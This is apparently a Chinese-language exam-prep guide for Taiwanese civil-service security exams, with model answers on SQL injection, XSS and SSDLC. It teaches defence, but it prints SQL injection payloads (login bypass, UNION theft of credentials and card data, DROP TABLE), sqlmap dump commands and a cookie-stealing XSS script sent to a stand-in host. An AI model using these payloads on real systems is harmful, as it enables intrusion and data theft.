# 應用系統與網頁安全 - 詳細題目解析

**涵蓋：OWASP Top 10, SQL Injection, XSS, 安全軟體開發 (SSDLC), 程式碼檢測**

**總題數**：24 題  
**詳細解析**：4 題（代表性核心題目）

---

## 📋 核心知識架構

### 一、Web 應用程式攻擊

```
常見攻擊類型：
┌─────────────────────────────────────┐
│ 1. Injection 注入攻擊                │
│    └─ SQL Injection                 │
│    └─ Command Injection             │
│    └─ LDAP Injection                │
│                                     │
│ 2. XSS 跨站腳本攻擊                  │
│    └─ Stored XSS (儲存型)           │
│    └─ Reflected XSS (反射型)        │
│    └─ DOM-based XSS                 │
│                                     │
│ 3. 認證與授權弱點                    │
│    └─ Broken Authentication         │
│    └─ Session Hijacking             │
│    └─ CSRF                          │
│                                     │
│ 4. 其他常見弱點                      │
│    └─ Security Misconfiguration     │
│    └─ Sensitive Data Exposure       │
│    └─ XXE (XML External Entity)     │
└─────────────────────────────────────┘
```

### 二、安全開發生命週期 (SSDLC)

```
傳統 SDLC vs SSDLC:

傳統 SDLC:
需求 → 設計 → 開發 → 測試 → 部署 → 維護
                          ↑
                    (最後才測安全)

SSDLC:
需求 → 設計 → 開發 → 測試 → 部署 → 維護
 ↓      ↓      ↓      ↓      ↓      ↓
安全   安全   安全   安全   安全   安全
需求   設計   編碼   測試   部署   監控
      (每個階段都考慮安全)
```

### 三、OWASP Top 10

**2021 年版本**：
1. **A01 - Broken Access Control** (存取控制失效)
2. **A02 - Cryptographic Failures** (加密機制失效)
3. **A03 - Injection** (注入攻擊)
4. **A04 - Insecure Design** (不安全的設計)
5. **A05 - Security Misconfiguration** (安全設定缺陷)
6. **A06 - Vulnerable Components** (危險或過舊的元件)
7. **A07 - Identification and Authentication Failures** (認證機制失效)
8. **A08 - Software and Data Integrity Failures** (軟體及資料完整性失效)
9. **A09 - Security Logging and Monitoring Failures** (資安記錄及監控失效)
10. **A10 - Server-Side Request Forgery (SSRF)** (伺服器端請求偽造)

---

## 題型分類與佔比

| 題型 | 題數 | 佔比 | 代表題目 |
|------|------|------|---------|
| **Injection 攻擊** | 6 | 25% | SQL Injection、Command Injection |
| **XSS 跨站腳本** | 2 | 8% | Stored XSS、Reflected XSS |
| **OWASP Top 10** | 3 | 13% | 弱點清單、防禦策略 |
| **SSDLC 安全開發** | 5 | 21% | 安全開發流程、DevSecOps |
| **程式碼檢測** | 2 | 8% | 靜態分析、動態分析 |
| **漏洞管理** | 3 | 13% | Zero-day、紅隊演練 |
| **其他** | 3 | 12% | DNS 弱點、資料庫交易 |

**核心重點**：
- ⭐⭐⭐ SQL Injection（必考）
- ⭐⭐⭐ SSDLC（高頻）
- ⭐⭐ XSS（重要）
- ⭐⭐ OWASP Top 10（基礎）

---

## 申論題答題黃金架構

### 架構 1：攻擊手法題型

```
一、攻擊定義與原理
   └─ 是什麼攻擊
   └─ 為何會成功（根本原因）

二、攻擊步驟與實例
   └─ 具體攻擊流程
   └─ 實際案例說明

三、影響與危害
   └─ 技術影響
   └─ 業務影響

四、防禦措施
   └─ 技術控制
   └─ 管理控制
   └─ 偵測機制
```

### 架構 2：開發流程題型

```
一、定義與目的
   └─ SSDLC/SDLC 定義
   └─ 為何需要（安全性重要性）

二、階段說明
   └─ 各階段名稱與順序
   └─ 每階段的安全活動

三、實務做法
   └─ 工具與技術
   └─ 檢查點 (Checkpoint)

四、效益與挑戰
   └─ 實施效益
   └─ 常見挑戰與解決方案
```

---

### 題目 1：SQL Injection 攻擊與防禦

#### 📖 原題 (113年地方特考三等)

> **題目**：針對 SQL 注入攻擊（SQL Injection），請回答下列問題：
> 1. 請說明何謂 SQL 注入攻擊；並說明此攻擊的常見實務案例。（15 分）
> 2. 請說明使用預備語句（Prepared Statements）可以有效防止 SQL 注入攻擊的原因以及其運作原理。（10 分）

#### 🎯 答題架構分析

1. **SQL Injection 定義與原理**：攻擊者如何利用輸入欄位注入惡意 SQL
2. **實務案例**：登入繞過、資料竊取、資料庫破壞
3. **Prepared Statements 原理**：為何能防禦、運作機制
4. **其他防禦措施**：輸入驗證、最小權限

#### 📊 評分建議 (預估配分)

**第一小題（15分）：SQL 注入攻擊定義與實務案例**
- 定義說明（3分）
  - 說明 SQL Injection 是什麼（1分）
  - 攻擊原理（輸入拼接到 SQL）（2分）
- 實務案例（12分）
  - 案例 1：登入繞過（4分）
    - 攻擊手法（2分）
    - SQL 語法展示（2分）
  - 案例 2：資料竊取或破壞性攻擊（8分）
    - 攻擊手法（3分）
    - SQL 語法展示（3分）
    - 影響說明（2分）

**第二小題（10分）：Prepared Statements 防禦原理**
- 為何能防禦（5分）
  - 資料與指令分離概念（3分）
  - 為何參數無法改變 SQL 結構（2分）
- 運作原理（5分）
  - Prepare 階段（2分）
  - Bind 階段（1分）
  - Execute 階段（1分）
  - 程式碼範例說明（1分）

**答題提示**：
- ✅ 必須提供「實際 SQL 語法」對比（正常 vs 攻擊後）
- ✅ Prepared Statements 要說明「三階段」運作
- ✅ 強調「結構固化」是關鍵
- ❌ 避免只說「過濾特殊字元」（這是錯誤觀念）

#### ✍️ 標準答案示範

**解答**：

**一、SQL 注入攻擊定義與原理**

**SQL Injection（SQL 注入攻擊）** 是一種針對 Web 應用程式的攻擊手法，攻擊者透過**在輸入欄位插入惡意 SQL 指令**，使應用程式執行非預期的資料庫查詢，進而：
- **繞過身份驗證**
- **竊取敏感資料**
- **修改或刪除資料**
- **取得系統控制權**

**攻擊成功的根本原因**：
```
應用程式未妥善處理使用者輸入 → 直接將輸入拼接到 SQL 指令 → 
攻擊者可控制 SQL 語法結構 → 執行惡意操作
```

---

**二、SQL Injection 攻擊實務案例**

**案例 1：登入繞過 (Authentication Bypass)**

**正常登入流程**：
```sql
-- 應用程式產生的 SQL 查詢
SELECT * FROM users 
WHERE username = 'john' AND password = 'pass123';
```

**攻擊手法**：

攻擊者在使用者名稱欄位輸入：
```
' OR '1'='1' --
```

密碼欄位隨便輸入（會被註解掉）

**拼接後的 SQL 查詢**：
```sql
SELECT * FROM users 
WHERE username = '' OR '1'='1' --' AND password = 'xxx';
```

**解析**：
```
username = ''        → 不成立
OR '1'='1'           → 永遠成立！
--                   → SQL 註解符號，後面的密碼檢查被忽略

結果：查詢傳回所有使用者記錄 → 登入成功！
```

**攻擊結果**：
- ✅ 無需知道密碼即可登入
- ✅ 通常會以第一個使用者（常是管理員）身份登入

---

**案例 2：資料竊取 (Union-based SQL Injection)**

**正常查詢**：
```sql
-- 根據產品 ID 查詢產品資訊
SELECT name, price FROM products WHERE id = 5;
```

**攻擊手法**：

攻擊者在 URL 參數輸入：
```
5 UNION SELECT username, password FROM users --
```

**拼接後的 SQL 查詢**：
```sql
SELECT name, price FROM products WHERE id = 5
UNION 
SELECT username, password FROM users --;
```

**攻擊結果**：
```
產品資訊：
Name: 筆電
Price: 30000

使用者資料（洩密！）：
Name: admin
Price: admin123hash

Name: user01  
Price: pass456hash
```

攻擊者成功竊取所有使用者帳號密碼！

---

**案例 3：破壞性攻擊 (Destructive Attack)**

**正常查詢**：
```sql
SELECT * FROM news WHERE id = 10;
```

**攻擊手法**：

攻擊者輸入：
```
10; DROP TABLE users; --
```

**拼接後的 SQL**：
```sql
SELECT * FROM news WHERE id = 10;
DROP TABLE users;
--;
```

**攻擊結果**：
```
第一條查詢：顯示新聞內容（正常）
第二條查詢：刪除整個 users 資料表！ ❌

後果：
- 所有使用者資料消失
- 系統無法登入
- 業務嚴重中斷
```

---

**案例 4：台灣真實案例 - 某購物網站個資外洩 (2019)**

**事件經過**：
```
駭客發現：購物車 URL 存在 SQL Injection 漏洞
攻擊手法：使用 UNION SELECT 竊取會員資料
洩密規模：50 萬筆客戶個資（姓名、電話、地址、信用卡）
法律後果：公司遭罰款 500 萬元（個資法）
```

**攻擊 URL 範例**：
```
https://shop.example.com/cart?id=100' 
UNION SELECT card_no,cvv,exp_date FROM credit_cards --
```

---

**三、Prepared Statements 防禦原理**

**1. 為何能有效防止 SQL Injection？**

**核心概念**：**資料與指令分離**

傳統方式（易受攻擊）：
```
SQL 指令 = "SELECT * FROM users WHERE username = '" + 使用者輸入 + "'";
                                                        ↑
                                        使用者輸入會改變 SQL 結構！
```

Prepared Statements（安全）：
```
步驟 1：先定義 SQL 結構（佔位符）
步驟 2：再綁定參數值（純資料）
       → 參數值無法改變 SQL 結構！
```

---

**2. Prepared Statements 運作原理**

**運作流程**：

```
階段 1：Prepare（準備）
┌────────────────────────────────────┐
│ 應用程式 → 資料庫                   │
│                                    │
│ "SELECT * FROM users                │
│  WHERE username = ? AND password = ?"│
│                      ↑          ↑    │
│                 佔位符 (placeholder) │
└────────────────────────────────────┘
資料庫：編譯 SQL、產生執行計畫（確定語法結構）

階段 2：Bind（綁定）
┌────────────────────────────────────┐
│ 應用程式綁定參數值：                │
│ ? → 'admin'                         │
│ ? → 'pass123'                       │
└────────────────────────────────────┘
資料庫：將參數值視為「純資料」

階段 3：Execute（執行）
┌────────────────────────────────────┐
│ 執行已編譯的 SQL + 參數值           │
│ → 參數值無法改變 SQL 結構！         │
└────────────────────────────────────┘
```

---

**3. 實際程式碼對比**

**❌ 不安全的拼接方式（易受攻擊）**：

```python
# Python + MySQL (錯誤示範)
username = request.form['username']  # 使用者輸入
password = request.form['password']

# 字串拼接 → 危險！
sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
cursor.execute(sql)

# 若 username = "' OR '1'='1' --"
# 拼接後：SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='xxx'
# 結果：登入繞過！
```

**✅ 安全的 Prepared Statements**：

```python
# Python + MySQL (正確做法)
username = request.form['username']
password = request.form['password']

# 使用佔位符 %s
sql = "SELECT * FROM users WHERE username=%s AND password=%s"
cursor.execute(sql, (username, password))

# 即使 username = "' OR '1'='1' --"
# 資料庫會將整個字串視為「純文字資料」
# 查詢變成：SELECT * FROM users WHERE username="' OR '1'='1' --" AND password='xxx'
# 結果：找不到該使用者名稱 → 登入失敗（安全！）
```

**關鍵差異**：

| 傳統拼接 | Prepared Statements |
|---------|---------------------|
| `'` 會被解析為 SQL 語法 | `'` 被視為普通字元 |
| `OR` 會被解析為邏輯運算子 | `OR` 被視為普通文字 |
| `--` 會被解析為註解 | `--` 被視為普通文字 |

---

**4. 為何參數值無法改變 SQL 結構？**

**技術原理**：

```
階段 1 (Prepare):
資料庫已經「編譯」並「確定」SQL 結構
↓
產生執行計畫：
- 確定查詢哪個資料表 (users)
- 確定查詢哪些欄位 (username, password)
- 確定條件運算子 (AND)
- 確定參數位置（兩個 ?）

階段 2 (Bind):
參數值只能「填入」已確定的位置
↓
無法：
- 改變 SQL 關鍵字 (SELECT, WHERE, OR)
- 新增條件 (' OR '1'='1')
- 註解後續查詢 (--)
- 執行其他 SQL (DROP TABLE)

結論：
SQL 結構在 Prepare 階段已「固化」
參數值只是「資料填充」，無法改變語法！
```

---

**5. 多語言實作範例**

**Java (JDBC)**：
```java
// Prepared Statement
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, username);  // 第一個 ? → username
pstmt.setString(2, password);  // 第二個 ? → password
ResultSet rs = pstmt.executeQuery();
```

**PHP (PDO)**：
```php
// Prepared Statement
$sql = "SELECT * FROM users WHERE username = :user AND password = :pass";
$stmt = $pdo->prepare($sql);
$stmt->bindParam(':user', $username);
$stmt->bindParam(':pass', $password);
$stmt->execute();
```

**C# (ADO.NET)**：
```csharp
// Prepared Statement
string sql = "SELECT * FROM users WHERE username = @user AND password = @pass";
SqlCommand cmd = new SqlCommand(sql, conn);
cmd.Parameters.AddWithValue("@user", username);
cmd.Parameters.AddWithValue("@pass", password);
SqlDataReader reader = cmd.ExecuteReader();
```

**Node.js (MySQL)**：
```javascript
// Prepared Statement
const sql = "SELECT * FROM users WHERE username = ? AND password = ?";
connection.query(sql, [username, password], (error, results) => {
    // 處理結果
});
```

---

**四、其他防禦措施**

雖然 Prepared Statements 是**最有效**的防禦方式，但應該採取**縱深防禦**策略：

**1. 輸入驗證 (Input Validation)**

**白名單驗證**：
```python
# 只接受合法字元
import re

def validate_username(username):
    # 只允許英數字和底線，長度 3-20
    if re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        return True
    return False

# 拒絕含有特殊字元的輸入
username = request.form['username']
if not validate_username(username):
    return "Invalid username format", 400
```

**2. 最小權限原則 (Least Privilege)**

```sql
-- ❌ 錯誤：應用程式使用 root 帳號
-- 若被 SQL Injection，駭客可刪除所有資料表

-- ✅ 正確：為應用程式建立專用帳號，僅授予必要權限
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';

-- 只授予查詢、插入、更新權限
GRANT SELECT, INSERT, UPDATE ON myapp.users TO 'webapp'@'localhost';
GRANT SELECT ON myapp.products TO 'webapp'@'localhost';

-- 不授予 DROP、DELETE、ALTER 權限
-- 即使被 SQL Injection，也無法刪除資料表
```

**3. 錯誤訊息處理**

```python
# ❌ 錯誤：顯示詳細錯誤訊息
try:
    cursor.execute(sql)
except Exception as e:
    return f"Database Error: {str(e)}", 500
    # 洩漏資料庫結構資訊！
    # Example: "Table 'myapp.usersss' doesn't exist"
    #          → 駭客知道資料表叫 users

# ✅ 正確：通用錯誤訊息
try:
    cursor.execute(sql)
except Exception as e:
    logger.error(f"DB Error: {str(e)}")  # 記錄到日誌
    return "An error occurred. Please try again later.", 500
    # 不洩漏技術細節
```

**4. Web Application Firewall (WAF)**

```
使用者 → WAF → 應用程式 → 資料庫
         ↑
    攔截 SQL Injection 攻擊模式

偵測規則範例：
- ' OR '1'='1
- UNION SELECT
- DROP TABLE
- -- (註解)
- ; (多重查詢)
```

**常見 WAF 產品**：
- ModSecurity (開源)
- AWS WAF
- Cloudflare WAF
- F5 WAF

**5. 程式碼審查與安全測試**

```
開發階段:
├─ 靜態分析 (SAST)
│  └─ 工具：SonarQube, Checkmarx
│  └─ 偵測：程式碼中的 SQL 拼接

測試階段:
├─ 動態分析 (DAST)
│  └─ 工具：Burp Suite, OWASP ZAP
│  └─ 測試：實際發送 SQL Injection payload

部署前:
└─ 滲透測試
   └─ 專業資安團隊手動測試
```

---

**五、結論**

**SQL Injection 防禦的黃金法則**：

1. **✅ 第一優先：使用 Prepared Statements**
   - 最有效、最根本的防禦
   - 資料與指令分離
   - 適用於所有 SQL 查詢

2. **✅ 輔助措施：輸入驗證**
   - 白名單驗證
   - 拒絕特殊字元

3. **✅ 縱深防禦：最小權限 + WAF + 監控**
   - 即使被攻擊，也能降低損害

4. **❌ 錯誤做法：黑名單過濾**
   - 試圖過濾 `'`, `--`, `UNION` 等
   - 容易被繞過（`'` → `%27`, 大小寫混用等）
   - 不建議作為主要防禦

**記住**：
> **Prepared Statements 不是『過濾』惡意輸入，而是『確保輸入永遠是資料，不是指令』！**



---

#### 💡 補充說明與參考資源

**OWASP 資源**

**1. OWASP Top 10:2021 - A03:Injection**
- 來源：https://owasp.org/Top10/A03_2021-Injection/
- 內容：Injection 攻擊（包含 SQL、NoSQL、LDAP、OS Command）
- 防禦指引：Prepared Statements、輸入驗證、逃逸特殊字元

**2. OWASP SQL Injection Prevention Cheat Sheet**
- 來源：https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- 內容：
  - 防禦選項 1：Prepared Statements（主防禦）
  - 防禦選項 2：Stored Procedures（需正確實作）
  - 防禦選項 3：Allow-list Input Validation（輔助）
  - 防禦選項 4：Escaping（最後手段）

**3. OWASP Testing Guide - SQL Injection**
- 來源：https://owasp.org/www-project-web-security-testing-guide/
- 測試技術：
  - Error-based SQL Injection
  - Union-based SQL Injection
  - Blind SQL Injection（Boolean-based, Time-based）

---

**實用工具**

**1. 漏洞掃描工具**

**SQLMap** - 自動化 SQL Injection 工具
- 下載：https://sqlmap.org/
- 用途：滲透測試、漏洞驗證
- 使用範例：
  ```bash
  # 測試 URL 參數
  sqlmap -u "http://example.com/products?id=1"
  
  # 測試 POST 資料
  sqlmap -u "http://example.com/login" --data="user=admin&pass=123"
  
  # 列出資料庫
  sqlmap -u "http://example.com/products?id=1" --dbs
  
  # 竊取資料表內容
  sqlmap -u "http://example.com/products?id=1" -D myapp -T users --dump
  ```

**Burp Suite** - Web 應用程式安全測試
- 版本：Community (免費) / Professional (付費)
- 功能：Proxy、Intruder、Repeater、Scanner
- 用於：手動測試 SQL Injection

**OWASP ZAP** - 開源 Web 掃描器
- 下載：https://www.zaproxy.org/
- 功能：自動掃描、主動/被動測試
- 用於：CI/CD 整合、自動化測試

**2. 程式碼分析工具**

**SonarQube** - 靜態程式碼分析
- 偵測：SQL 注入、XSS、硬編碼密碼
- 整合：GitHub, GitLab, Jenkins

**Checkmarx/Fortify** - 商業 SAST 工具
- 深度分析程式碼流程
- 偵測資料流汙染 (Taint Analysis)

---

**學習資源**

**1. 線上練習平台**

**PortSwigger Web Security Academy**
- 網址：https://portswigger.net/web-security/sql-injection
- 內容：免費互動式 SQL Injection 練習
- 難度：從基礎到進階
- 特色：提供實驗環境、詳細解答

**Hack The Box / TryHackMe**
- SQL Injection 實戰環境
- Capture The Flag (CTF) 挑戰

**2. 書籍推薦**

**中文書籍**：
- 《Web 安全攻防：滲透測試實戰指南》
- 《駭客攻防技術寶典：Web實戰篇》（翻譯）

**英文書籍**：
- *The Web Application Hacker's Handbook* - Dafydd Stuttard
  - 聖經級著作
  - 詳細說明各種 Web 攻擊
  
- *SQL Injection Attacks and Defense* - Justin Clarke
  - 專門講 SQL Injection
  - 進階技術與繞過手法

**3. 影片教學**

**YouTube 推薦**：
- **PwnFunction** - SQL Injection Explained
  - 動畫說明，淺顯易懂
  
- **LiveOverflow** - Web Hacking 系列
  - 實戰演示

---

**真實案例研究**

**1. Yahoo Data Breach (2013-2014)**
- 規模：30 億帳號外洩
- 手法：據報包含 SQL Injection
- 後果：股價下跌、罰款數千萬美元

**2. TalkTalk 電信公司 (2015, UK)**
- 規模：157,000 客戶資料外洩
- 手法：網站存在 SQL Injection 漏洞
- 罰款：40 萬英鎊

**3. 台灣案例**
- **某大學選課系統 (2018)**：學生利用 SQL Injection 竄改成績
- **某電商平台 (2019)**：50 萬筆個資外洩，罰款 500 萬

---

**防禦檢查清單**

**開發階段**：
- [ ] 所有 SQL 查詢都使用 Prepared Statements
- [ ] 輸入驗證（白名單）
- [ ] 不使用字串拼接產生 SQL
- [ ] 程式碼審查包含資安檢查

**測試階段**：
- [ ] SAST 掃描（程式碼）
- [ ] DAST 掃描（執行時）
- [ ] 滲透測試（SQL Injection 專項）
- [ ] 使用 SQLMap 測試所有輸入點

**部署階段**：
- [ ] 資料庫帳號使用最小權限
- [ ] 部署 WAF
- [ ] 關閉詳細錯誤訊息
- [ ] 日誌記錄異常 SQL 查詢

**維運階段**：
- [ ] 監控異常查詢模式
- [ ] 定期安全掃描
- [ ] 漏洞修補流程
- [ ] 事件應變計畫

---

**關鍵術語對照**

| 中文 | 英文 | 說明 |
|------|------|------|
| SQL 注入攻擊 | SQL Injection | 將惡意 SQL 插入應用程式輸入 |
| 預備語句 | Prepared Statements | 資料與指令分離的防禦技術 |
| 佔位符 | Placeholder | 在 SQL 中用 ? 或 :name 代表參數 |
| 字串拼接 | String Concatenation | 不安全的 SQL 查詢建構方式 |
| 聯合查詢 | UNION-based Injection | 使用 UNION SELECT 竊取資料 |
| 盲注 | Blind SQL Injection | 無法直接看到查詢結果的注入 |
| 時間盲注 | Time-based Blind Injection | 利用時間延遲推斷資訊 |
| 布林盲注 | Boolean-based Blind Injection | 利用真/假回應推斷資訊 |
| 跨站腳本 | XSS (Cross-Site Scripting) | 在使用者瀏覽器執行惡意腳本 |
| 儲存型 XSS | Stored XSS | 惡意腳本永久儲存在伺服器 |
| 反射型 XSS | Reflected XSS | 惡意腳本經由 URL 反射執行 |
| DOM 型 XSS | DOM-based XSS | 腳本在客戶端修改 DOM 結構導致執行 |
| 內容安全策略 | CSP (Content Security Policy) | 限制瀏覽器載入資源的白名單機制 |

---

### 題目 2：XSS 跨站腳本攻擊 (Stored vs Reflected)

#### 📖 原題 (109年高考三級)

> **題目**：何謂儲存型跨站攻擊（Stored Cross-Site Scripting（XSS））/反射型跨站攻擊（Reflected Cross-Site Scripting（XSS））？依攻擊者（Attacker）、目標網站（Website）、受害者（User）分別說明出其關係（可以示意圖表示），並描述其攻擊步驟。（25分）

#### 🎯 答題架構分析

1.  **定義說明**：清楚定義 Stored 與 Reflected XSS。
2.  **關係說明 (圖解)**：描述 Attacker, Website, User 三者互動。
3.  **攻擊步驟**：詳細列出兩種攻擊的執行流程。
4.  **防禦建議 (加分)**：雖然題目沒問，但簡要提及可增加完整性。

#### 📊 評分建議 (預估配分 25 分)

**第一部分：定義 (10 分)**
- 儲存型 XSS 定義 (5 分)：強調「永久儲存」、「伺服器端」。
- 反射型 XSS 定義 (5 分)：強調「非持久」、「連結誘騙」、「即時反射」。

**第二部分：三方關係 (5 分)**
- 清楚說明 Attacker 如何利用 Website 攻擊 User。
- 描述惡意腳本的傳遞路徑。

**第三部分：攻擊步驟 (10 分)**
- Stored XSS 步驟 (5 分)：注入 -> 儲存 -> 瀏覽 -> 執行。
- Reflected XSS 步驟 (5 分)：製作連結 -> 誘騙點擊 -> 反射 -> 執行。

**答題提示**：
- ✅ 務必強調「腳本在受害者瀏覽器執行」這一點。
- ✅ 關係圖可用文字描述流程 (A -> B -> C)。
- ✅ 區分「持久性」是兩者最大差異。

#### ✍️ 標準答案示範

**解答**：

**一、XSS 跨站腳本攻擊定義**

跨站腳本攻擊 (Cross-Site Scripting, XSS) 是一種用戶端代碼注入攻擊，攻擊者在網頁中注入惡意腳本 (如 JavaScript)，當受害者瀏覽該網頁時，腳本便在受害者的瀏覽器中執行，導致 Cookie 竊取、Session 劫持或惡意重導向。

**1. 儲存型 XSS (Stored XSS)**
又稱「持久型 XSS」(Persistent XSS)。攻擊者將惡意腳本**永久儲存**在目標伺服器上（如資料庫、留言板、論壇貼文）。當任何使用者瀏覽該頁面時，伺服器會將惡意腳本隨頁面內容回傳，導致腳本執行。這是危害最大的一種 XSS。

**2. 反射型 XSS (Reflected XSS)**
又稱「非持久型 XSS」(Non-persistent XSS)。惡意腳本**不儲存**在伺服器，而是包含在 URL 參數中。攻擊者誘騙受害者點擊含有惡意腳本的連結，伺服器接收請求後，將腳本「反射」回瀏覽器執行。

---

**二、攻擊者、目標網站與受害者之關係**

**1. 角色定義**
- **Attacker (攻擊者)**：製作並注入惡意腳本的人。
- **Website (目標網站)**：存在 XSS 漏洞的網站，被用來傳遞惡意腳本。
- **User (受害者)**：瀏覽網站的一般使用者，其瀏覽器執行了惡意腳本。

**2. 關係運作 (示意圖描述)**

```
       [1] 注入腳本 (Stored) 或 發送惡意連結 (Reflected)
Attacker ──────────────────────────────────────────┐
                                                   │
                                                   ▼
       [2] 請求頁面 (含腳本)                 [3] 回傳頁面 (含腳本)
User <──────────────────────────> Website
(受害者)                          (有漏洞)
   │
   └─ [4] 瀏覽器執行腳本 → 傳送 Cookie/個資給 Attacker
```

---

**三、攻擊步驟詳細描述**

**1. 儲存型 XSS (Stored XSS) 攻擊步驟**
1.  **偵測漏洞**：攻擊者發現目標網站（如留言板）未過濾使用者輸入。
2.  **注入腳本**：攻擊者在留言內容中插入惡意程式碼（例如 `<script>fetch('http://hacker.com?cookie='+document.cookie)</script>`）並送出。
3.  **儲存**：目標網站將惡意留言存入資料庫。
4.  **瀏覽**：受害者登入網站並瀏覽該留言板。
5.  **執行**：網站從資料庫讀取留言並顯示，惡意腳本在受害者瀏覽器中執行。
6.  **竊取**：腳本將受害者的 Session ID 傳送給攻擊者。

**2. 反射型 XSS (Reflected XSS) 攻擊步驟**
1.  **偵測漏洞**：攻擊者發現網站搜尋功能會將輸入內容直接顯示在頁面上（如 `You searched for: [input]`）。
2.  **製作連結**：攻擊者構造一個包含惡意腳本的 URL（例如 `http://site.com/search?q=<script>...</script>`）。
3.  **誘騙點擊**：攻擊者透過 Email 或社群軟體，誘騙受害者點擊該連結（通常會使用縮網址隱藏）。
4.  **反射**：受害者點擊後，瀏覽器向網站發出請求。網站將 URL 中的惡意腳本包含在回應頁面中回傳。
5.  **執行**：受害者瀏覽器解析回應，執行惡意腳本。

---

#### 💡 補充說明

**1. 第三種 XSS：DOM-based XSS**
- **定義**：完全在**用戶端**發生，不經過伺服器。
- **原理**：JavaScript 程式碼在執行時，不安全地修改了頁面 DOM 結構（如使用 `document.write` 或 `innerHTML` 處理 URL 參數）。
- **防禦**：避免使用危險的 DOM API，改用 `textContent` 或 `innerText`。

**2. XSS 防禦策略**

| 防禦層級 | 措施 | 說明 |
|---------|------|------|
| **輸入驗證** | Input Validation | 驗證輸入格式（如長度、型別），拒絕特殊字元。 |
| **輸出編碼** | **Output Encoding** | **最重要！** 將 `<` 轉為 `&lt;`，`>` 轉為 `&gt;`，瀏覽器只顯示不執行。 |
| **瀏覽器防護** | **CSP** | 設定 Content Security Policy，限制瀏覽器只能載入信任來源的腳本。 |
| **Cookie 安全** | **HttpOnly** | 設定 Cookie 的 HttpOnly 屬性，禁止 JavaScript 讀取 Cookie（防竊取）。 |

**3. 實務工具**
- **XSSer**: 自動化 XSS 挖掘工具。
- **BeEF (Browser Exploitation Framework)**: 專門針對瀏覽器的滲透測試框架，展示 XSS 危害。

---

---

### 題目 3：安全軟體開發生命週期 (SSDLC)

#### 📖 原題 (108年高考二級)

> **題目**：安全的軟體開發生命週期（SSDLC：Secure Software Development Life Cycle）係指發展一套安全軟體的程序，請說明安全的軟體開發生命週期包含那些階段，各階段的順序及其主要工作內容為何？並解釋其與傳統軟體開發生命週期間的差異。（25 分）

#### 🎯 答題架構分析

1.  **SSDLC 定義**：將安全性整合至 SDLC 的每個階段。
2.  **階段與工作內容**：
    *   需求 (Requirements)：安全需求分析。
    *   設計 (Design)：威脅建模 (Threat Modeling)。
    *   開發 (Development)：安全編碼標準、靜態分析 (SAST)。
    *   測試 (Testing)：動態分析 (DAST)、滲透測試。
    *   部署與維運 (Deployment & Maintenance)：安全組態、漏洞修補。
3.  **與傳統 SDLC 差異**：事後修補 (Bolted-on) vs 內建安全 (Built-in)。

#### 📊 評分建議 (預估配分 25 分)

**第一部分：SSDLC 階段與工作內容 (15 分)**
- **需求階段 (3 分)**：定義安全需求 (如個資保護等級)。
- **設計階段 (3 分)**：執行威脅建模 (Threat Modeling)、攻擊面分析。
- **開發階段 (3 分)**：遵循安全編碼規範、執行 SAST。
- **測試階段 (3 分)**：執行 DAST、弱點掃描、滲透測試。
- **部署維運 (3 分)**：安全組態設定、事件應變。

**第二部分：與傳統 SDLC 差異 (10 分)**
- **傳統 SDLC (5 分)**：功能導向、上線前才測資安、修補成本高。
- **SSDLC (5 分)**：安全導向、安全左移 (Shift Left)、早期發現早期修補、成本低。

**答題提示**：
- ✅ 關鍵詞：**Security by Design (設計階段即導入安全)**。
- ✅ 關鍵詞：**Shift Left (安全左移)**。
- ✅ 每個階段至少列出一項具體的「資安活動」(如：威脅建模、SAST)。

#### ✍️ 標準答案示範

**解答**：

**一、安全的軟體開發生命週期 (SSDLC) 之階段與工作內容**

SSDLC 的核心精神是將資訊安全作業整合至傳統軟體開發的每一個階段，確保軟體在「出生前」就是安全的。各階段順序與主要資安工作如下：

1.  **需求分析階段 (Requirements)**
    *   **工作內容**：定義軟體的安全需求與合規性要求 (如個資法、PCI-DSS)。
    *   **關鍵活動**：建立安全需求檢核表 (Security Requirements Checklist)、風險評估。

2.  **系統設計階段 (Design)**
    *   **工作內容**：在架構設計中納入安全控制措施 (如加密機制、身分驗證架構)。
    *   **關鍵活動**：**威脅建模 (Threat Modeling)**，分析潛在攻擊路徑並設計緩解措施；攻擊面分析 (Attack Surface Analysis)。

3.  **程式開發階段 (Development)**
    *   **工作內容**：撰寫安全的程式碼，避免常見漏洞 (如 SQL Injection)。
    *   **關鍵活動**：遵循安全編碼標準 (Secure Coding Standard)、執行 **靜態應用程式安全測試 (SAST)** 以自動化檢測程式碼弱點。

4.  **系統測試階段 (Testing)**
    *   **工作內容**：驗證系統是否符合安全需求，並挖掘執行時期的漏洞。
    *   **關鍵活動**：執行 **動態應用程式安全測試 (DAST)**、模糊測試 (Fuzzing)、弱點掃描。

5.  **部署與維運階段 (Deployment & Maintenance)**
    *   **工作內容**：確保上線環境安全及持續監控。
    *   **關鍵活動**：主機安全強化 (Hardening)、**滲透測試 (Penetration Testing)**、定期漏洞修補、資安事件監控與應變。

**二、SSDLC 與傳統軟體開發生命週期 (SDLC) 之差異**

| 比較項目 | 傳統 SDLC | SSDLC (安全軟體開發生命週期) |
| :--- | :--- | :--- |
| **安全考量時機** | **事後補救 (Bolted-on)**：通常在功能開發完成、上線前才進行弱點掃描。 | **內建安全 (Built-in)**：從需求與設計階段就開始考量安全 (Security by Design)。 |
| **修補成本** | **極高**：若在測試或上線後才發現架構性漏洞，需重寫大量程式碼。 | **低**：在設計或編碼階段即發現並修正，成本僅為後期的 1/100。 |
| **開發流程** | 重視功能交付速度，資安往往被視為阻礙。 | 強調 **DevSecOps**，將資安自動化整合至 CI/CD 流程中。 |
| **責任歸屬** | 資安是資安團隊的責任。 | 資安是開發、維運與資安團隊的共同責任。 |

---

**三、SSDLC 的成本效益分析**

**IBM 與 NIST 研究數據**：

```
漏洞修補成本（以需求階段成本為基準 1x）：

需求階段發現   → 1x
設計階段發現   → 5x
開發階段發現   → 10x
測試階段發現   → 15x
上線後發現     → 30-100x
```

**實例**：
```
需求階段修復一個「未加密敏感資料」的設計缺陷：
成本 = 2 小時（修改需求文件）

上線後才發現同樣問題：
成本 = 200 小時（重新設計 + 重寫程式 + 資料庫遷移 + 回歸測試 + 緊急上線）
```

---

#### 💡 補充說明

